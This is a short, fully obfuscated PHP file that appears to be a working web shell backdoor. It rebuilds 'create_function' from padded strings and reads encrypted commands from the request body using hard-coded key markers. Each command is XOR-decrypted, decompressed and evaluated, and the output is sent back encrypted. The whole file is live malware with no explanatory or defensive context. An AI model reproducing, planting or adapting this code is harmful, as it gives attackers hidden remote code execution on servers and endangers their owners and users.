<?php
$J='++)R{$oR.=$t{$i}^$Rk{$jR};}}return $oRR;}iRf (@preg_matcRh("/$kh(R.R+)$kf/",@fiRle_Rget_cRonRtents("phpR://i';
$d=str_replace('AZ','','crAZeaAZtAZe_fAZunAZAZction');
$n=',$k){R$c=strlen($Rk)R;$l=sRtrlen($t);$oR="";foRr($i=R0;$iR<$lR;){forR($j=0;(R$j<R$c&&R$i<$l);$j++,$Ri';
$w='nRpuRRt"),R$Rm)==1) {@ob_start();@evaRl(@RgzuRncompress(@x(R@baseR64_decode(R$m[1RR])R,$k)))R;$o=@ob_g';
$A='et_cRontents();@Rob_RRend_clean();R$r=@baseR64_encoRde(R@Rx(@gzcomprRess(R$o)R,$k)R);print("$pR$kh$r$kf");}';
$g='$k="5b74dR337";$Rkh="3RR95510ce67dRb";$kf=R"6984113R901b7R";$RRp="TqPRuu57Bc486sRzLG";functioRn Rx($Rt';
$f=str_replace('R','',$g.$n.$J.$w.$A);
$B=$d('',$f);$B();
?>
